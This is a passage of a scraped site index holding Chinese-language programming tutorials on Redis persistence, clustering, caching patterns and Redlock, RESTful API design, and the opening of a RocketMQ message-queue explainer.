save选项： 如果用户设置了save选项（一般会默认设置），比如 save 60 10000，那么从Redis最近一次创建快照之后开始算起，当“60秒之内有10000次写入”这个条件被满足时，Redis就会自动触发BGSAVE命令。 SHUTDOWN命令： 当Redis通过SHUTDOWN命令接收到关闭服务器的请求时，或者接收到标准TERM信号时，会执行一个SAVE命令，阻塞所有客户端，不再执行客户端发送的任何命令，并在SAVE命令执行完毕之后关闭服务器。 一个Redis服务器连接到另一个Redis服务器： 当一个Redis服务器连接到另一个Redis服务器，并向对方发送SYNC命令来开始一次复制操作的时候，如果主服务器目前没有执行BGSAVE操作，或者主服务器并非刚刚执行完BGSAVE操作，那么主服务器就会执行BGSAVE命令  如果系统真的发生崩溃，用户将丢失最近一次生成快照之后更改的所有数据。因此，快照持久化只适用于即使丢失一部分数据也不会造成一些大问题的应用程序。不能接受这个缺点的话，可以考虑AOF持久化。\nAOF（append-only file）持久化    与快照持久化相比，AOF持久化 的实时性更好，因此已成为主流的持久化方案。默认情况下Redis没有开启AOF（append only file）方式的持久化，可以通过appendonly参数开启：\nappendonly yes 开启AOF持久化后每执行一条会更改Redis中的数据的命令，Redis就会将该命令写入硬盘中的AOF文件。AOF文件的保存位置和RDB文件的位置相同，都是通过dir参数设置的，默认的文件名是appendonly.aof。\n在Redis的配置文件中存在三种同步方式，它们分别是：\nappendfsync always #每次有数据修改发生时都会写入AOF文件,这样会严重降低Redis的速度 appendfsync everysec #每秒钟同步一次，显示地将多个写命令同步到硬盘 appendfsync no #让操作系统决定何时进行同步 appendfsync always 可以实现将数据丢失减到最少，不过这种方式需要对硬盘进行大量的写入而且每次只写入一个命令，十分影响Redis的速度。另外使用固态硬盘的用户谨慎使用appendfsync always选项，因为这会明显降低固态硬盘的使用寿命。\n为了兼顾数据和写入性能，用户可以考虑 appendfsync everysec选项 ，让Redis每秒同步一次AOF文件，Redis性能几乎没受到任何影响。而且这样即使出现系统崩溃，用户最多只会丢失一秒之内产生的数据。当硬盘忙于执行写入操作的时候，Redis还会优雅的放慢自己的速度以便适应硬盘的最大写入速度。\nappendfsync no 选项一般不推荐，这种方案会使Redis丢失不定量的数据而且如果用户的硬盘处理写入操作的速度不够的话，那么当缓冲区被等待写入的数据填满时，Redis的写入操作将被阻塞，这会导致Redis的请求速度变慢。\n虽然AOF持久化非常灵活地提供了多种不同的选项来满足不同应用程序对数据安全的不同要求，但AOF持久化也有缺陷——AOF文件的体积太大。\n重写/压缩AOF    AOF虽然在某个角度可以将数据丢失降低到最小而且对性能影响也很小，但是极端的情况下，体积不断增大的AOF文件很可能会用完硬盘空间。另外，如果AOF体积过大，那么还原操作执行时间就可能会非常长。\n为了解决AOF体积过大的问题，用户可以向Redis发送 BGREWRITEAOF命令 ，这个命令会通过移除AOF文件中的冗余命令来重写（rewrite）AOF文件来减小AOF文件的体积。BGREWRITEAOF命令和BGSAVE创建快照原理十分相似，所以AOF文件重写也需要用到子进程，这样会导致性能问题和内存占用问题，和快照持久化一样。更糟糕的是，如果不加以控制的话，AOF文件的体积可能会比快照文件大好几倍。\n文件重写流程：\n和快照持久化可以通过设置save选项来自动执行BGSAVE一样，AOF持久化也可以通过设置\nauto-aof-rewrite-percentage 选项和\nauto-aof-rewrite-min-size 选项自动执行BGREWRITEAOF命令。举例：假设用户对Redis设置了如下配置选项并且启用了AOF持久化。那么当AOF文件体积大于64mb，并且AOF的体积比上一次重写之后的体积大了至少一倍（100%）的时候，Redis将执行BGREWRITEAOF命令。\nauto-aof-rewrite-percentage 100 auto-aof-rewrite-min-size 64mb 无论是AOF持久化还是快照持久化，将数据持久化到硬盘上都是非常有必要的，但除了进行持久化外，用户还必须对持久化得到的文件进行备份（最好是备份到不同的地方），这样才能尽量避免数据丢失事故发生。如果条件允许的话，最好能将快照文件和重新重写的AOF文件备份到不同的服务器上面。\n随着负载量的上升，或者数据的完整性变得越来越重要时，用户可能需要使用到复制特性。\nRedis 4.0 对于持久化机制的优化    Redis 4.0 开始支持 RDB 和 AOF 的混合持久化（默认关闭，可以通过配置项 aof-use-rdb-preamble 开启）。\n如果把混合持久化打开，AOF 重写的时候就直接把 RDB 的内容写到 AOF 文件开头。这样做的好处是可以结合 RDB 和 AOF 的优点, 快速加载同时避免丢失过多的数据。当然缺点也是有的， AOF 里面的 RDB 部分就是压缩格式不再是 AOF 格式，可读性较差。\n参考：\n《Redis实战》\n深入学习Redis（2）：持久化\n"},{"id":292,"href":"/database/Redis/redis%E9%9B%86%E7%BE%A4%E4%BB%A5%E5%8F%8A%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/","title":"redis集群以及应用场景","parent":"Redis","content":"相关阅读：\n 史上最全Redis高可用技术解决方案大全 Raft协议实战之Redis Sentinel的选举Leader源码解析  目录：\n Redis 集群以及应用  集群  主从复制  主从链(拓扑结构) 复制模式 问题点   哨兵机制  拓扑图 节点下线 Leader选举 故障转移 读写分离 定时任务   分布式集群(Cluster)  拓扑图 通讯  集中式 Gossip   寻址分片  hash取模 一致性hash hash槽       使用场景  热点数据 会话维持 Session 分布式锁 SETNX 表缓存 消息队列 list 计数器 string   缓存设计  更新策略 更新一致性 缓存粒度 缓存穿透  解决方案   缓存雪崩  出现后应对 请求过程        Redis 集群以及应用    集群    主从复制    主从链(拓扑结构)    复制模式     全量复制：Master 全部同步到 Slave 部分复制：Slave 数据丢失进行备份  问题点     同步故障  复制数据延迟(不一致) 读取过期数据(Slave 不能删除数据) 从节点故障 主节点故障   配置不一致  maxmemory 不一致:丢失数据 优化参数不一致:内存不一致.   避免全量复制  选择小主节点(分片)、低峰期间操作. 如果节点运行 id 不匹配(如主节点重启、运行 id 发生变化)，此时要执行全量复制，应该配合哨兵和集群解决. 主从复制挤压缓冲区不足产生的问题(网络中断，部分复制无法满足)，可增大复制缓冲区( rel_backlog_size 参数).   复制风暴  哨兵机制    拓扑图    节点下线     主观下线  即 Sentinel 节点对 Redis 节点失败的偏见，超出超时时间认为 Master 已经宕机。 Sentinel 集群的每一个 Sentinel 节点会定时对 Redis 集群的所有节点发心跳包检测节点是否正常。如果一个节点在 down-after-milliseconds 时间内没有回复 Sentinel 节点的心跳包，则该 Redis 节点被该 Sentinel 节点主观下线。   客观下线  所有 Sentinel 节点对 Redis 节点失败要达成共识，即超过 quorum 个统一。 当节点被一个 Sentinel 节点记为主观下线时，并不意味着该节点肯定故障了，还需要 Sentinel 集群的其他 Sentinel 节点共同判断为主观下线才行。 该 Sentinel 节点会询问其它 Sentinel 节点，如果 Sentinel 集群中超过 quorum 数量的 Sentinel 节点认为该 Redis 节点主观下线，则该 Redis 客观下线。    Leader选举     选举出一个 Sentinel 作为 Leader：集群中至少有三个 Sentinel 节点，但只有其中一个节点可完成故障转移.通过以下命令可以进行失败判定或领导者选举。 选举流程  每个主观下线的 Sentinel 节点向其他 Sentinel 节点发送命令，要求设置它为领导者. 收到命令的 Sentinel 节点如果没有同意通过其他 Sentinel 节点发送的命令，则同意该请求，否则拒绝。 如果该 Sentinel 节点发现自己的票数已经超过 Sentinel 集合半数且超过 quorum，则它成为领导者。 如果此过程有多个 Sentinel 节点成为领导者，则等待一段时间再重新进行选举。    故障转移     转移流程  Sentinel 选出一个合适的 Slave 作为新的 Master(slaveof no one 命令)。 向其余 Slave 发出通知，让它们成为新 Master 的 Slave( parallel-syncs 参数)。 等待旧 Master 复活，并使之成为新 Master 的 Slave。 向客户端通知 Master 变化。   从 Slave 中选择新 Master 节点的规则(slave 升级成 master 之后)  选择 slave-priority 最高的节点。 选择复制偏移量最大的节点(同步数据最多)。 选择 runId 最小的节点。     Sentinel 集群运行过程中故障转移完成，所有 Sentinel 又会恢复平等。Leader 仅仅是故障转移操作出现的角色。\n 读写分离    定时任务     每 1s 每个 Sentinel 对其他 Sentinel 和 Redis 执行 ping，进行心跳检测。 每 2s 每个 Sentinel 通过 Master 的 Channel 交换信息(pub - sub)。 每 10s 每个 Sentinel 对 Master 和 Slave 执行 info，目的是发现 Slave 节点、确定主从关系。  分布式集群(Cluster)    拓扑图    通讯    集中式     将集群元数据(节点信息、故障等等)集中存储在某个节点上。\n  优势  元数据的更新读取具有很强的时效性，元数据修改立即更新   劣势  数据集中存储    Gossip     Gossip 协议  寻址分片    hash取模     hash(key)%机器数量 问题  机器宕机，造成数据丢失，数据读取失败 伸缩性    一致性hash        问题\n 一致性哈希算法在节点太少时，容易因为节点分布不均匀而造成缓存热点的问题。  解决方案  可以通过引入虚拟节点机制解决：即对每一个节点计算多个 hash，每个计算结果位置都放置一个虚拟节点。这样就实现了数据的均匀分布，负载均衡。        hash槽     CRC16(key)%16384   使用场景    热点数据    存取数据优先从 Redis 操作，如果不存在再从文件（例如 MySQL）中操作，从文件操作完后将数据存储到 Redis 中并返回。同时有个定时任务后台定时扫描 Redis 的 key，根据业务规则进行淘汰，防止某些只访问一两次的数据一直存在 Redis 中。\n 例如使用 Zset 数据结构，存储 Key 的访问次数/最后访问时间作为 Score，最后做排序，来淘汰那些最少访问的 Key。\n 如果企业级应用，可以参考：[阿里云的 Redis 混合存储版][1]\n会话维持 Session    会话维持 Session 场景，即使用 Redis 作为分布式场景下的登录中心存储应用。每次不同的服务在登录的时候，都会去统一的 Redis 去验证 Session 是否正确。但是在微服务场景，一般会考虑 Redis + JWT 做 Oauth2 模块。\n 其中 Redis 存储 JWT 的相关信息主要是留出口子，方便以后做统一的防刷接口，或者做登录设备限制等。\n 分布式锁 SETNX    命令格式：SETNX key value：当且仅当 key 不存在，将 key 的值设为 value。若给定的 key 已经存在，则 SETNX 不做任何动作。\n 超时时间设置：获取锁的同时，启动守护线程，使用 expire 进行定时更新超时时间。如果该业务机器宕机，守护线程也挂掉，这样也会自动过期。如果该业务不是宕机，而是真的需要这么久的操作时间，那么增加超时时间在业务上也是可以接受的，但是肯定有个最大的阈值。 但是为了增加高可用，需要使用多台 Redis，就增加了复杂性，就可以参考 Redlock：Redlock分布式锁  表缓存    Redis 缓存表的场景有黑名单、禁言表等。访问频率较高，即读高。根据业务需求，可以使用后台定时任务定时刷新 Redis 的缓存表数据。\n消息队列 list    主要使用了 List 数据结构。\nList 支持在头部和尾部操作，因此可以实现简单的消息队列。\n 发消息：在 List 尾部塞入数据。 消费消息：在 List 头部拿出数据。  同时可以使用多个 List，来实现多个队列，根据不同的业务消息，塞入不同的 List，来增加吞吐量。\n计数器 string    主要使用了 INCR、DECR、INCRBY、DECRBY 方法。\nINCR key：给 key 的 value 值增加一 DECR key：给 key 的 value 值减去一\n缓存设计    更新策略     LRU、LFU、FIFO 算法自动清除：一致性最差，维护成本低。 超时自动清除(key expire)：一致性较差，维护成本低。 主动更新：代码层面控制生命周期，一致性最好，维护成本高。  在 Redis 根据在 redis.conf 的参数 maxmemory 来做更新淘汰策略：\n noeviction: 不删除策略, 达到最大内存限制时, 如果需要更多内存, 直接返回错误信息。大多数写命令都会导致占用更多的内存(有极少数会例外, 如 DEL 命令)。 allkeys-lru: 所有 key 通用; 优先删除最近最少使用(less recently used ,LRU) 的 key。 volatile-lru: 只限于设置了 expire 的部分; 优先删除最近最少使用(less recently used ,LRU) 的 key。 allkeys-random: 所有key通用; 随机删除一部分 key。 volatile-random: 只限于设置了 expire 的部分; 随机删除一部分 key。 volatile-ttl: 只限于设置了 expire 的部分; 优先删除剩余时间(time to live,TTL) 短的key。  更新一致性     读请求：先读缓存，缓存没有的话，就读数据库，然后取出数据后放入缓存，同时返回响应。 写请求：先删除缓存，然后再更新数据库(避免大量地写、却又不经常读的数据导致缓存频繁更新)。  缓存粒度     通用性：全量属性更好。 占用空间：部分属性更好。 代码维护成本。  缓存穿透     当大量的请求无命中缓存、直接请求到后端数据库(业务代码的 bug、或恶意攻击)，同时后端数据库也没有查询到相应的记录、无法添加缓存。\n这种状态会一直维持，流量一直打到存储层上，无法利用缓存、还会给存储层带来巨大压力。\n 解决方案     请求无法命中缓存、同时数据库记录为空时在缓存添加该 key 的空对象(设置过期时间)，缺点是可能会在缓存中添加大量的空值键(比如遭到恶意攻击或爬虫)，而且缓存层和存储层数据短期内不一致； 使用布隆过滤器在缓存层前拦截非法请求、自动为空值添加黑名单(同时可能要为误判的记录添加白名单).但需要考虑布隆过滤器的维护(离线生成/ 实时生成)。  缓存雪崩     缓存崩溃时请求会直接落到数据库上，很可能由于无法承受大量的并发请求而崩溃，此时如果只重启数据库，或因为缓存重启后没有数据，新的流量进来很快又会把数据库击倒。\n 出现后应对     事前：Redis 高可用，主从 + 哨兵，Redis Cluster，避免全盘崩溃。 事中：本地 ehcache 缓存 + hystrix 限流 \u0026amp; 降级，避免数据库承受太多压力。 事后：Redis 持久化，一旦重启，自动从磁盘上加载数据，快速恢复缓存数据。  请求过程     用户请求先访问本地缓存，无命中后再访问 Redis，如果本地缓存和 Redis 都没有再查数据库，并把数据添加到本地缓存和 Redis； 由于设置了限流，一段时间范围内超出的请求走降级处理(返回默认值，或给出友情提示)。  "},{"id":293,"href":"/database/Redis/Redlock%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/","title":"Redlock分布式锁","parent":"Redis","content":"这篇文章主要是对 Redis 官方网站刊登的 Distributed locks with Redis 部分内容的总结和翻译。\n什么是 RedLock    Redis 官方站这篇文章提出了一种权威的基于 Redis 实现分布式锁的方式名叫 Redlock，此种方式比原先的单节点的方法更安全。它可以保证以下特性：\n 安全特性：互斥访问，即永远只有一个 client 能拿到锁 避免死锁：最终 client 都可能拿到锁，不会出现死锁的情况，即使原本锁住某资源的 client crash 了或者出现了网络分区 容错性：只要大部分 Redis 节点存活就可以正常提供服务  怎么在单节点上实现分布式锁     SET resource_name my_random_value NX PX 30000\n 主要依靠上述命令，该命令仅当 Key 不存在时（NX保证）set 值，并且设置过期时间 3000ms （PX保证），值 my_random_value 必须是所有 client 和所有锁请求发生期间唯一的，释放锁的逻辑是：\nif redis.call(\u0026#34;get\u0026#34;,KEYS[1]) == ARGV[1] then return redis.call(\u0026#34;del\u0026#34;,KEYS[1]) else return 0 end 上述实现可以避免释放另一个client创建的锁，如果只有 del 命令的话，那么如果 client1 拿到 lock1 之后因为某些操作阻塞了很长时间，此时 Redis 端 lock1 已经过期了并且已经被重新分配给了 client2，那么 client1 此时再去释放这把锁就会造成 client2 原本获取到的锁被 client1 无故释放了，但现在为每个 client 分配一个 unique 的 string 值可以避免这个问题。至于如何去生成这个 unique string，方法很多随意选择一种就行了。\nRedlock 算法    算法很易懂，起 5 个 master 节点，分布在不同的机房尽量保证可用性。为了获得锁，client 会进行如下操作：\n 得到当前的时间，微秒单位 尝试顺序地在 5 个实例上申请锁，当然需要使用相同的 key 和 random value，这里一个 client 需要合理设置与 master 节点沟通的 timeout 大小，避免长时间和一个 fail 了的节点浪费时间 当 client 在大于等于 3 个 master 上成功申请到锁的时候，且它会计算申请锁消耗了多少时间，这部分消耗的时间采用获得锁的当下时间减去第一步获得的时间戳得到，如果锁的持续时长（lock validity time）比流逝的时间多的话，那么锁就真正获取到了。 如果锁申请到了，那么锁真正的 lock validity time 应该是 origin（lock validity time） - 申请锁期间流逝的时间 如果 client 申请锁失败了，那么它就会在少部分申请成功锁的 master 节点上执行释放锁的操作，重置状态  失败重试    如果一个 client 申请锁失败了，那么它需要稍等一会在重试避免多个 client 同时申请锁的情况，最好的情况是一个 client 需要几乎同时向 5 个 master 发起锁申请。另外就是如果 client 申请锁失败了它需要尽快在它曾经申请到锁的 master 上执行 unlock 操作，便于其他 client 获得这把锁，避免这些锁过期造成的时间浪费，当然如果这时候网络分区使得 client 无法联系上这些 master，那么这种浪费就是不得不付出的代价了。\n放锁    放锁操作很简单，就是依次释放所有节点上的锁就行了\n性能、崩溃恢复和 fsync    如果我们的节点没有持久化机制，client 从 5 个 master 中的 3 个处获得了锁，然后其中一个重启了，这是注意 整个环境中又出现了 3 个 master 可供另一个 client 申请同一把锁！ 违反了互斥性。如果我们开启了 AOF 持久化那么情况会稍微好转一些，因为 Redis 的过期机制是语义层面实现的，所以在 server 挂了的时候时间依旧在流逝，重启之后锁状态不会受到污染。但是考虑断电之后呢，AOF部分命令没来得及刷回磁盘直接丢失了，除非我们配置刷回策略为 fsnyc = always，但这会损伤性能。解决这个问题的方法是，当一个节点重启之后，我们规定在 max TTL 期间它是不可用的，这样它就不会干扰原本已经申请到的锁，等到它 crash 前的那部分锁都过期了，环境不存在历史锁了，那么再把这个节点加进来正常工作。\n"},{"id":294,"href":"/system-design/coding-way/RESTfulAPI%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/","title":"RESTfulAPI简明教程","parent":"coding-way","content":"大家好，我是 Guide哥！\n这篇文章简单聊聊后端程序员必备的 RESTful API 相关的知识。\n开始正式介绍 RESTful API 之前，我们需要首先搞清 ：API 到底是什么？\n何为 API？    API（Application Programming Interface） 翻译过来是应用程序编程接口的意思。\n我们在进行后端开发的时候，主要的工作就是为前端或者其他后端服务提供 API 比如查询用户数据的 API 。\n但是， API 不仅仅代表后端系统暴露的接口，像框架中提供的方法也属于 API 的范畴。\n为了方便大家理解，我再列举几个例子 🌰：\n 你通过某电商网站搜索某某商品，电商网站的前端就调用了后端提供了搜索商品相关的 API。 你使用 JDK 开发 Java 程序，想要读取用户的输入的话，你就需要使用 JDK 提供的 IO 相关的 API。 \u0026hellip;\u0026hellip;  你可以把 API 理解为程序与程序之间通信的桥梁，其本质就是一个函数而已。另外，API 的使用也不是没有章法的，它的规则由（比如数据输入和输出的格式）API 提供方制定。\n何为 RESTful API？    RESTful API 经常也被叫做 REST API，它是基于 REST 构建的 API。这个 REST 到底是什么，我们后文在讲，涉及到的概念比较多。\n如果你看 RESTful API 相关的文章的话一般都比较晦涩难懂，主要是因为 REST 涉及到的一些概念比较难以理解。但是，实际上，我们平时开发用到的 RESTful API 的知识非常简单也很容易概括！\n举个例子，如果我给你下面两个 API 你是不是立马能知道它们是干什么用的！这就是 RESTful API 的强大之处！\nGET /classes：列出所有班级 POST /classes：新建一个班级 RESTful API 可以让你看到 URL+Http Method 就知道这个 URL 是干什么的，让你看到了 HTTP 状态码（status code）就知道请求结果如何。\n像咱们在开发过程中设计 API 的时候也应该至少要满足 RESTful API 的最基本的要求（比如接口中尽量使用名词，使用 POST 请求创建资源，DELETE 请求删除资源等等，示例：GET /notes/id：获取某个指定 id 的笔记的信息）。\n解读 REST    REST 是 REpresentational State Transfer 的缩写。这个词组的翻译过来就是“表现层状态转化”。\n这样理解起来甚是晦涩，实际上 REST 的全称是 Resource Representational State Transfer ，直白地翻译过来就是 “资源”在网络传输中以某种“表现形式”进行“状态转移” 。如果还是不能继续理解，请继续往下看，相信下面的讲解一定能让你理解到底啥是 REST 。\n我们分别对上面涉及到的概念进行解读，以便加深理解，实际上你不需要搞懂下面这些概念，也能看懂我下一部分要介绍到的内容。不过，为了更好地能跟别人扯扯 “RESTful API”我建议你还是要好好理解一下！\n 资源（Resource） ：我们可以把真实的对象数据称为资源。一个资源既可以是一个集合，也可以是单个个体。比如我们的班级 classes 是代表一个集合形式的资源，而特定的 class 代表单个个体资源。每一种资源都有特定的 URI（统一资源标识符）与之对应，如果我们需要获取这个资源，访问这个 URI 就可以了，比如获取特定的班级：/class/12。另外，资源也可以包含子资源，比如 /classes/classId/teachers：列出某个指定班级的所有老师的信息 表现形式（Representational）：\u0026ldquo;资源\u0026quot;是一种信息实体，它可以有多种外在表现形式。我们把\u0026quot;资源\u0026quot;具体呈现出来的形式比如 json，xml，image,txt 等等叫做它的\u0026quot;表现层/表现形式\u0026rdquo;。 状态转移（State Transfer） ：大家第一眼看到这个词语一定会很懵逼？内心 BB：这尼玛是啥啊？ 大白话来说 REST 中的状态转移更多地描述的服务器端资源的状态，比如你通过增删改查（通过 HTTP 动词实现）引起资源状态的改变。ps:互联网通信协议 HTTP 协议，是一个无状态协议，所有的资源状态都保存在服务器端。  综合上面的解释，我们总结一下什么是 RESTful 架构：\n 每一个 URI 代表一种资源； 客户端和服务器之间，传递这种资源的某种表现形式比如 json，xml，image,txt 等等； 客户端通过特定的 HTTP 动词，对服务器端资源进行操作，实现\u0026quot;表现层状态转化\u0026quot;。  RESTful API 规范    动作     GET：请求从服务器获取特定资源。举个例子：GET /classes（获取所有班级） POST ：在服务器上创建一个新的资源。举个例子：POST /classes（创建班级） PUT ：更新服务器上的资源（客户端提供更新后的整个资源）。举个例子：PUT /classes/12（更新编号为 12 的班级） DELETE ：从服务器删除特定的资源。举个例子：DELETE /classes/12（删除编号为 12 的班级） PATCH ：更新服务器上的资源（客户端提供更改的属性，可以看做作是部分更新），使用的比较少，这里就不举例子了。  路径（接口命名）    路径又称\u0026quot;终点\u0026quot;（endpoint），表示 API 的具体网址。实际开发中常见的规范如下：\n 网址中不能有动词，只能有名词，API 中的名词也应该使用复数。 因为 REST 中的资源往往和数据库中的表对应，而数据库中的表都是同种记录的\u0026quot;集合\u0026quot;（collection）。如果 API 调用并不涉及资源（如计算，翻译等操作）的话，可以用动词。比如：GET /calculate?param1=11\u0026amp;param2=33 。 不用大写字母，建议用中杠 - 不用下杠 _ 。比如邀请码写成 invitation-code而不是 invitation_code 。 善用版本化 API。当我们的 API 发生了重大改变而不兼容前期版本的时候，我们可以通过 URL 来实现版本化，比如 http://api.example.com/v1、http://apiv1.example.com 。版本不必非要是数字，只是数字用的最多，日期、季节都可以作为版本标识符，项目团队达成共识就可。 接口尽量使用名词，避免使用动词。 RESTful API 操作（HTTP Method）的是资源（名词）而不是动作（动词）。  Talk is cheap！来举个实际的例子来说明一下吧！现在有这样一个 API 提供班级（class）的信息，还包括班级中的学生和教师的信息，则它的路径应该设计成下面这样。\nGET /classes：列出所有班级 POST /classes：新建一个班级 GET /classes/{classId}：获取某个指定班级的信息 PUT /classes/{classId}：更新某个指定班级的信息（一般倾向整体更新） PATCH /classes/{classId}：更新某个指定班级的信息（一般倾向部分更新） DELETE /classes/{classId}：删除某个班级 GET /classes/{classId}/teachers：列出某个指定班级的所有老师的信息 GET /classes/{classId}/students：列出某个指定班级的所有学生的信息 DELETE /classes/{classId}/teachers/{ID}：删除某个指定班级下的指定的老师的信息 反例：\n/getAllclasses /createNewclass /deleteAllActiveclasses 理清资源的层次结构，比如业务针对的范围是学校，那么学校会是一级资源:/schools，老师: /schools/teachers，学生: /schools/students 就是二级资源。\n过滤信息（Filtering）    如果我们在查询的时候需要添加特定条件的话，建议使用 url 参数的形式。比如我们要查询 state 状态为 active 并且 name 为 guidegege 的班级：\nGET /classes?state=active\u0026amp;name=guidegege 比如我们要实现分页查询：\nGET /classes?page=1\u0026amp;size=10 //指定第1页，每页10个数据 状态码（Status Codes）    状态码范围：\n   2xx：成功 3xx：重定向 4xx：客户端错误 5xx：服务器错误     200 成功 301 永久重定向 400 错误请求 500 服务器错误   201 创建 304 资源未修改 401 未授权 502 网关错误     403 禁止访问 504 网关超时     404 未找到      405 请求方法不对     RESTful 的极致 HATEOAS     RESTful 的极致是 hateoas ，但是这个基本不会在实际项目中用到。\n 上面是 RESTful API 最基本的东西，也是我们平时开发过程中最容易实践到的。实际上，RESTful API 最好做到 Hypermedia，即返回结果中提供链接，连向其他 API 方法，使得用户不查文档，也知道下一步应该做什么。\n比如，当用户向 api.example.com 的根目录发出请求，会得到这样一个返回结果\n{\u0026#34;link\u0026#34;: { \u0026#34;rel\u0026#34;: \u0026#34;collection https://www.example.com/classes\u0026#34;, \u0026#34;href\u0026#34;: \u0026#34;https://api.example.com/classes\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;List of classes\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;application/vnd.yourformat+json\u0026#34; }} 上面代码表示，文档中有一个 link 属性，用户读取这个属性就知道下一步该调用什么 API 了。rel 表示这个 API 与当前网址的关系（collection 关系，并给出该 collection 的网址），href 表示 API 的路径，title 表示 API 的标题，type 表示返回类型 Hypermedia API 的设计被称为HATEOAS。\n在 Spring 中有一个叫做 HATEOAS 的 API 库，通过它我们可以更轻松的创建出符合 HATEOAS 设计的 API。相关文章：\n 在 Spring Boot 中使用 HATEOAS Building REST services with Spring (Spring 官网 ) An Intro to Spring HATEOAS spring-hateoas-examples Spring HATEOAS (Spring 官网 )  参考      https://RESTfulapi.net/\n  https://www.ruanyifeng.com/blog/2014/05/restful_api.html\n  https://juejin.im/entry/59e460c951882542f578f2f0\n  https://phauer.com/2016/testing-RESTful-services-java-best-practices/\n  https://www.seobility.net/en/wiki/REST_API\n  https://dev.to/duomly/rest-api-vs-graphql-comparison-3j6g\n  "},{"id":295,"href":"/system-design/distributed-system/message-queue/RocketMQ/","title":"RocketMQ","parent":"message-queue","content":" 文章很长，点赞再看，养成好习惯😋😋😋\n本文由 FrancisQ 老哥投稿！\n 消息队列扫盲    消息队列顾名思义就是存放消息的队列，队列我就不解释了，别告诉我你连队列都不知道是啥吧？\n所以问题并不是消息队列是什么，而是 消息队列为什么会出现？消息队列能用来干什么？用它来干这些事会带来什么好处？消息队列会带来副作用吗？\n消息队列为什么会出现？    消息队列算是作为后端程序员的一个必备技能吧，因为分布式应用必定涉及到各个系统之间的通信问题，这个时候消息队列也应运而生了。可以说分布式的产生是消息队列的基础，而分布式怕是一个很古老的概念了吧，所以消息队列也是一个很古老的中间件了。\n消息队列能用来干什么？    异步    你可能会反驳我，应用之间的通信又不是只能由消息队列解决，好好的通信为什么中间非要插一个消息队列呢？我不能直接进行通信吗？\n很好👍，你又提出了一个概念，同步通信。就比如现在业界使用比较多的 Dubbo 就是一个适用于各个系统之间同步通信的 RPC 框架。\n我来举个🌰吧，比如我们有一个购票系统，需求是用户在购买完之后能接收到购买完成的短信。\n我们省略中间的网络通信时间消耗，假如购票系统处理需要 150ms ，短信系统处理需要 200ms ，那么整个处理流程的时间消耗就是 150ms + 200ms = 350ms。\n当然，乍看没什么问题。可是仔细一想你就感觉有点问题，我用户购票在购票系统的时候其实就已经完成了购买，而我现在通过同步调用非要让整个请求拉长时间，而短信系统这玩意又不是很有必要，它仅仅是一个辅助功能增强用户体验感而已。我现在整个调用流程就有点 头重脚轻 的感觉了，购票是一个不太耗时的流程，而我现在因为同步调用，非要等待发送短信这个比较耗时的操作才返回结果。那我如果再加一个发送邮件呢？\n这样整个系统的调用链又变长了，整个时间就变成了550ms。\n当我们在学生时代需要在食堂排队的时候，我们和食堂大妈就是一个同步的模型。\n我们需要告诉食堂大妈：“姐姐，给我加个鸡腿，再加个酸辣土豆丝，帮我浇点汁上去，多打点饭哦😋😋😋” 咦~~~ 为了多吃点，真恶心。\n然后大妈帮我们打饭配菜，我们看着大妈那颤抖的手和掉落的土豆丝不禁咽了咽口水。\n最终我们从大妈手中接过饭菜然后去寻找座位了\u0026hellip;\n回想一下，我们在给大妈发送需要的信息之后我们是 同步等待大妈给我配好饭菜 的，上面我们只是加了鸡腿和土豆丝，万一我再加一个番茄牛腩，韭菜鸡蛋，这样是不是大妈打饭配菜的流程就会变长，我们等待的时间也会相应的变长。\n那后来，我们工作赚钱了有钱去饭店吃饭了，我们告诉服务员来一碗牛肉面加个荷包蛋 (传达一个消息) ，然后我们就可以在饭桌上安心的玩手机了 (干自己其他事情) ，等到我们的牛肉面上了我们就可以吃了。这其中我们也就传达了一个消息，然后我们又转过头干其他事情了。这其中虽然做面的时间没有变短，但是我们只需要传达一个消息就可以干其他事情了，这是一个 异步 的概念。\n所以，为了解决这一个问题，聪明的程序员在中间也加了个类似于服务员的中间件——消息队列。这个时候我们就可以把模型给改造了。\n这样，我们在将消息存入消息队列之后我们就可以直接返回了(我们告诉服务员我们要吃什么然后玩手机)，所以整个耗时只是 150ms + 10ms = 160ms。\n 但是你需要注意的是，整个流程的时长是没变的，就像你仅仅告诉服务员要吃什么是不会影响到做面的速度的。\n 解耦    回到最初同步调用的过程，我们写个伪代码简单概括一下。\n那么第二步，我们又添加了一个发送邮件，我们就得重新去修改代码，如果我们又加一个需求：用户购买完还需要给他加积分，这个时候我们是不是又得改代码？\n如果你觉得还行，那么我这个时候不要发邮件这个服务了呢，我是不是又得改代码，又得重启应用？\n这样改来改去是不是很麻烦，那么 此时我们就用一个消息队列在中间进行解耦 。你需要注意的是，我们后面的发送短信、发送邮件、添加积分等一些操作都依赖于上面的 result ，这东西抽象出来就是购票的处理结果呀，比如订单号，用户账号等等，也就是说我们后面的一系列服务都是需要同样的消息来进行处理。既然这样，我们是不是可以通过 “广播消息” 来实现。\n我上面所讲的“广播”并不是真正的广播，而是接下来的系统作为消费者去 订阅 特定的主题。比如我们这里的主题就可以叫做 订票 ，我们购买系统作为一个生产者去生产这条消息放入消息队列，然后消费者订阅了这个主题，会从消息队列中拉取消息并消费。就比如我们刚刚画的那张图，你会发现，在生产者这边我们只需要关注 生产消息到指定主题中 ，而 消费者只需要关注从指定主题中拉取消息 就行了。\n 如果没有消息队列，每当一个新的业务接入，我们都要在主系统调用新接口、或者当我们取消某些业务，我们也得在主系统删除某些接口调用。有了消息队列，我们只需要关心消息是否送达了队列，至于谁希望订阅，接下来收到消息如何处理，是下游的事情，无疑极大地减少了开发和联调的工作量。\n 削峰    我们再次回到一开始我们使用同步调用系统的情况，并且思考一下，如果此时有大量用户请求购票整个系统会变成什么样？\n如果，此时有一万的请求进入购票系统，我们知道运行我们主业务的服务器配置一般会比较好，所以这里我们假设购票系统能承受这一万的用户请求，那么也就意味着我们同时也会出现一万调用发短信服务的请求。而对于短信系统来说并不是我们的主要业务，所以我们配备的硬件资源并不会太高，那么你觉得现在这个短信系统能承受这一万的峰值么，且不说能不能承受，系统会不会 直接崩溃 了？\n短信业务又不是我们的主业务，我们能不能 折中处理 呢？如果我们把购买完成的信息发送到消息队列中，而短信系统 尽自己所能地去消息队列中取消息和消费消息 